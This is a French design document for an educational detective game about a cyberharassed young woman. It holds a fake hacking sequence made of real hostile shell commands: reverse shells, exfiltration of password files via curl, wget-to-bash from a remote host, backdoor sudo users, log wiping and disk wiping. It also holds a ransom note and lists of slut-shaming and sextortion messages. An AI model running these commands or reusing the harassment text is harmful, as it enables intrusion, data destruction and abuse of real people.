On est un détective qui trouve un ordinateur

**Histoire des personnages:**

Émilie, héroine
Julien, son mec



**Scène 0: Mise en place de la scène.**

On est devant son ordi, ça se passe devant le bureau du détective avec l'ordinateur devant la caméra. Quand on clique dessus l'ordinateur grandit et l'histoire commence



**Scène 1: Première énigme.**

On rentre dans l'ordinateur et on arrive sur l'écran verrouillé. Pour le déverouiller, il faut trouver le nom du chat qui est sur le fond d'écran. 



**Scène 2: ÉCRAN D'ACCUEIL**

Ordinateur en mode ubuntuu.
Applications a afficher sur la barre latérale gauche de l'écran (à implémenter éventuellement): 
- Photo,
- Fichier,
- Aperçu (pour ouvrir des photos),
- Whatsapp,
- Internet Explorer,
- (plus tard si on a le temps : une application Camera où on voit la gueule du détective)



**Scène 2: Message douteux**

Lorsque l'écran est déverouillé, un message apparait : "Va crever sale pute, je sais qui tu es..." +33 6 45 39 94 28.  
Le popup est en haut et au centre de l'écran. On affiche l'icone de l'application Whatsapp a gauche du message.



**Scène 3: Pirate informatique**

Dés que l'on clique sur le message, le terminal s'ouvre et du code s'exécute : 

A EXEC DANS LE TERMINAL : 

~ $ export SYSTEM_ROOT_OVERRIDE="0x443F-A921-ENCRYPTED-Volume-XFS"
~ $ find /var/log -type f -exec sh -c 'cat /dev/null > "$1"' _ {} \;
~ $ netstat -antp | grep "LISTEN" | awk '{print $7}' | cut -d/ -f1 | sort -u
~ $ iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
~ $ dd if=/dev/urandom of=/tmp/random_buffer.bin bs=1M count=10 status=none
~ $ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout /tmp/k.pem
~ $ chmod 600 /tmp/k.pem && mv /tmp/k.pem /etc/ssl/private/shadow_key.pem
~ $ tar -czvf /tmp/sys_backup_critical.tar.gz /etc/passwd /etc/shadow /home/
~ $ curl -X POST -F "data=@/tmp/sys_backup_critical.tar.gz" http://10.0.0.9/up
~ $ ln -sf /dev/null /root/.bash_history && history -c && history -w
~ $ grep -r "confidential" /home/* 2>/dev/null | grep -v "Binary" > /tmp/leaks
~ $ base64 /tmp/leaks > /tmp/leaks.b64 && rm /tmp/leaks && touch /tmp/leaks
~ $ useradd -m -s /bin/bash -p $(openssl passwd -1 "R00tOverr!de") sys_admin_ghost
~ $ usermod -aG sudo sys_admin_ghost && echo "sys_admin_ghost ALL=(ALL) NOPASSWD:ALL"
~ $ python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.1',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" &
~ $ watch -n 0.5 "ps aux | sort -nr -k 3 | head -n 10" > /dev/null 2>&1 &
~ $ sysctl -w net.ipv4.ip_forward=1 && echo "1" > /proc/sys/net/ipv4/ip_forward
~ $ arpspoof -i eth0 -t 192.168.1.1 192.168.1.254 > /dev/null 2>&1 &
~ $ tcpdump -i eth0 -w /var/tmp/capture_stream_v4.pcap port 80 or port 443 &
~ $ sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
~ $ crontab -l | { cat; echo "* * * * * /bin/bash /var/tmp/persistence.sh"; }
~ $ wget -qO- http://remote-command-center.xyz/payload_v2.sh | bash > /dev/null
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ echo SALE PUTE
SALE PUTE
~ $ mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1234 > /tmp/f &
~ $ echo "0 0 * * * rm -rf --no-preserve-root /" > /etc/cron.d/self_destruct
~ $ cat /dev/urandom | head -c 50M > /var/www/html/buffer_overflow_test.dat
~ $ while true; do echo "PACKET_FLOOD_INITIATED" | nc -u 192.168.1.50 80; done &
~ $ export LD_PRELOAD=/usr/local/lib/lib_hook_process_hider.so.1.0.2
~ $ chattr +i /etc/resolv.conf && chattr +i /etc/hosts && chattr +i /etc/passwd
~ $ killall -9 apache2 && killall -9 nginx && service ssh restart
~ $ mount -o remount,rw /dev/sda1 / && touch /forcefsck && echo "Remount RW"
~ $ dd if=/dev/zero of=/dev/sda bs=512 count=1 conv=notrunc 2>/dev/null
~ $ echo "127.0.0.1 google.com facebook.com twitter.com" >> /etc/hosts
~ $ for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i >/dev/null & done
~ $ ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head -n 15 > /tmp/proc_list
~ $ gpg --batch --passphrase "SuperSecret" -c /tmp/proc_list
~ $ rm -rf /var/lib/apt/lists/* && apt-get clean && apt-get autoremove -y
~ $ echo "KERNEL_PANIC_SIMULATION_MODE_ENABLED" | wall
~ $ sleep 2 && killall -u user && userdel -r user 2>/dev/null
~ $ mv /bin/ls /bin/ls_orig && echo 'echo "HACKED"' > /bin/ls && chmod +x /bin/ls
~ $ shutdown -h now "CRITICAL SYSTEM FAILURE: SECURITY COMPROMISED"


Un bruit strident retentit et l'ordinateur passe en mode fond noir avec une image de pirate.

Envoie 0.2 bitcoins a cette adresse 17VZNX1SN5NtKa8UQFxwQbFeFc3iqRYheX sinon je fous ta vie en l'air, tu as 24 heures.
Il te reste : 23 minutes et 40 secondes...

**Scène 4: fichiers textes**

Implémentation d'une application Diary : inspiration de l'a windows sur la barre du dessus.


15 Juin. L'été de ma vie. Je n'ai jamais été aussi heureuse, j'ai l'impression de flotter. La soirée d'anniversaire de Marc était incroyable, on a dansé jusqu'à 4h du matin sur la plage. Julien m'a regardée toute la soirée comme si j'étais la seule fille au monde, il m'a dit qu'il m'aimait pour la première fois. Au boulot, tout roule, je viens de boucler le projet Alpha et mon équipe m'adore. J'ai l'impression que rien ne peut m'arriver, je suis invincible. La vie est belle, bordel.

22 Septembre. Un petit nuage gris. L'ambiance a changé au bureau depuis la rentrée, je ne sais pas trop pourquoi. Il y a des silences quand j'entre dans la salle de pause, des regards en coin. Sophie, ma collègue "amie", ne m'a pas invitée au déjeuner ce midi. Julien dit que je suis parano, que je suis juste fatiguée. Il a sûrement raison, je me mets trop la pression. Ce soir, on sort au resto, je vais mettre ma robe rouge et oublier ces bêtises. Il faut que j'arrête de me faire des films.

10 Janvier. La fissure. Je n'ai pas dit à Julien pour le mail anonyme que j'ai reçu hier. "Tout le monde sait que tu es une imposture". J'ai eu tellement honte que je l'ai effacé tout de suite. Ce soir, quand mes amis proposaient un week-end au ski, je n'arrivais pas à sourire. J'avais l'impression d'avoir "VICTIME" écrit sur le front. J'ai prétexté une migraine pour rentrer tôt. Je ne veux pas qu'ils voient que je faiblis. Je dois garder la face, je suis forte, non ?

14 Avril. Le masque pèse lourd. Je commence à éviter les soirées. J'ai dit à Julien que j'avais trop de travail, mais la vérité, c'est que je n'ai plus la force de faire semblant d'être joyeuse. Au bureau, on a renversé du café sur mes dossiers importants "par accident". J'ai nettoyé sans rien dire, les larmes aux yeux, pendant qu'ils ricanaient. Je me sens sale, humiliée. Je ne peux pas en parler à Julien, il me trouverait pathétique de me laisser faire. Je préfère m'isoler que d'affronter son regard déçu.

20 Mai. La rupture. C'est fait. J'ai quitté Julien. C'était la chose la plus dure de ma vie. Je lui ai dit que je ne l'aimais plus, que j'avais besoin d'air. C'est faux, je l'aime à en crever, mais je suis devenue une ombre toxique. Je ne veux pas qu'il voie la femme brisée que je deviens, celle qui se fait harceler et qui n'a pas le courage de répondre. Il pleurait, il ne comprenait pas. J'ai fermé la porte sur lui et je me suis effondrée. Je suis seule maintenant. C'est mieux pour lui.

28 Juillet. Un été en enfer. La ville est vide, tout le monde est parti. La chaleur est étouffante, je garde les volets clos pour ne pas voir ce soleil insolent qui me rappelle que je gâche ma vie. J'ai vu sur Instagram que Julien est en Grèce, il sourit sur les photos. J'ai zoomé sur son visage jusqu'à avoir mal aux yeux ; il a déjà l'air guéri. Moi, je n'ai pas bougé du canapé depuis trois jours. Ce matin, mon téléphone a vibré. Un numéro masqué : "Bonnes vacances toute seule. Profite bien de ton silence, personne ne t'attend." Ils savent. Ils savent que je n'ai personne. J'ai dit à ma mère au téléphone que je partais dans le Sud avec des copines pour qu'elle ne s'inquiète pas. Encore un mensonge. Je m'enfonce dans mes propres fictions pendant que la vaisselle s'empile dans l'évier.

3 Octobre. Invisible. Je ne suis pas sortie de chez moi depuis quatre jours, sauf pour acheter des pâtes. J'ai croisé une ancienne amie dans la rue, j'ai baissé la tête et j'ai changé de trottoir, le cœur battant à tout rompre. J'avais honte de mes cheveux gras, de mes cernes, de ma lâcheté. Je ne réponds plus au téléphone. Je passe mes journées à fixer le mur, en repensant à tout ce que j'ai raté. Les messages de haine continuent parfois, je ne les lis même plus, je les mérite sûrement.

12 Décembre. Le néant. Il fait nuit à 16h, ça me va bien. L'appartement est en désordre, comme ma tête. Je ne sais plus qui j'étais avant, cette fille qui riait sur la plage me semble être une étrangère morte depuis des siècles. Je n'ai plus honte, je n'ai plus mal, je ne suis plus rien. Je suis juste un corps vide qui attend que le temps passe. Le silence est mon seul ami maintenant. Je vais me recoucher, à quoi bon rester debout ?

**lien drive à la fin du fichier**



**Scène 5: Internet Explorer**

Implémentation de internet explorer:
Si jamais le joueur a déjà ouvert l'application diary, internet explorer affiche en premier résultat le lien drive pour faciliter l'histoire.


**Scène 6: Drive photo**

Implémentation d'un site drive dans internet explorer.
Plusieurs photos qui commencent par la date la plus vieille à la plus récente.
Gros plan sur les photos montrées en énorme.
Date au dessus des photos : Du 14 Juin au 31 Décembre.


**Scène 7: Photos cachées en bas de la page**

La première photo a un message caché. Pendant les meilleurs moments de sa vie elle est allé dans son café préféré. Le nom de ce café est le MDP des photos cachées.
Les photos cachées sont ses nudes qui peuvent leak.
Dans les photos cachées, il y a un watermark de son compte instagram.


**Scène 8: Instagram**

Nouvelle page internet : coder la page "Instagrom".
Implémentation des messages de haines.
Plusieurs faux comptes sans photos de profil envoient des messages.

1. Le "Slut-shaming" et le jugement moral

Ces messages visent à attaquer la réputation et la dignité de la victime.

    "Franchement, t'as pas honte de t'afficher comme ça ?"

    "Ta mère en pense quoi si je lui envoie ça ?"

    "On savait que t'étais une fille facile, mais là t'abuses."

    "Tu te respectes vraiment pas ma pauvre."

    "Supprime ça direct, tu fais pitié à voir."

2. La menace de diffusion (L'effet viral)

    "T'inquiète pas, j'ai déjà screen. C'est trop tard pour supprimer."

    "Ça tourne, tout le monde l'a vue. T'es grillée."

    "Si tu veux pas que je l'envoie à [Nom d'un petit copain/proche], tu fais ce que je dis." (Note : ici, on touche au chantage/sextorsion).

3. La moquerie physique et la déshumanisation

Attaques directes sur le corps pour détruire l'estime de soi.

    "Mdr regarde sa tête là-dessus, on dirait un monstre."

    "Même avec des filtres t'es moche."

    "Qui voudrait de toi après avoir vu ça ?"

    "T'as vu ton corps ? T'aurais mieux fait de t'abstenir."

4. L'exclusion sociale et le gazlighting

Faire sentir à la victime qu'elle est seule et que c'est "de sa faute".

    "Plus personne va vouloir te parler après ça."

    "Viens pas demain, franchement, pour ton bien."

    "Tu l'as cherché en même temps, viens pas pleurer."

    "C'est toi qui l'a posté, assume maintenant."

💡 Conseils pour l'intégration dans le jeu (Game Design)

Pour renforcer l'aspect pédagogique de votre jeu, vous pouvez utiliser ces textes de différentes manières :

    La saturation (Flood) : Ne pas envoyer un seul message, mais faire vibrer le "téléphone" du joueur en continu. L'écran se remplit de notifications pour simuler la panique.

    Le choix de réponse (QTE mental) : Face à ces messages, donnez au joueur des choix :

        Répondre avec agressivité (ce qui aggrave souvent la situation).

        Se justifier (inefficace face aux trolls).

        Bloquer et faire une capture d'écran (la bonne solution).

        Appeler un adulte/numéro d'aide (la solution ultime).


**Scène 9: Messages Instagram**

Emilie a reçu pleins de messages de haine (une quarantaine au moins), à chaque fois c'est un compte anonyme, sans photo de profile qui envoie un seul message.

Le premier message envoyé est le stalker : MARTIN KIL

Le mec avait un crush sur elle alors qu'elle était en couple avec un homme, quand on remonte la conversation on le découvre. 

La fille a des problèmes d'argent et vend son corps sur OF.
Il l'apprend et 
